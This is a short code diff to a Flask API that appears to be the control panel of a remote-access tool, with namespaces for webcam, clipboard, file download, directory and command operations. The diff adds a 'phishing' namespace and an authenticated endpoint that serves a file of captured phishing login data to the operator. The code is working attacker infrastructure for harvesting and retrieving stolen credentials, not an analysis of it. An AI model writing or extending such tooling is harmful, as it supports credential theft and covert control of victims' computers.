@@ -55,6 +55,7 @@ webcam_ns = api.namespace('api/v1/webcam', description='Webcam operations')
 clipboard_ns = api.namespace('api/v1/clipboard', description='Clipboard operations')
 download_file_ns = api.namespace('api/v1/download', description='Download file operations')
 directory_ns = api.namespace('api/v1/directory', description='Directory operations')
+phishing_ns = api.namespace('api/v1/phishing', description='Phishing operations')
 
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
 command_model = api.model('Command', {
@@ -731,6 +732,17 @@ def login():
             return redirect(url_for('home'))  # Fallback si l'origine n'est pas connue
     else:
         return "Missing data", 400
+
+
+@phishing_ns.route('/login_data')
+class GetLoginData(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    def get(self):
+        if os.path.exists('phishing/login_data.txt'):
+            return send_file('phishing/login_data.txt')
+        else:
+            return {'status': 'error', 'message': 'Fichier de données de connexion non trouvé.'}, 404
 
 
 setup_logging()
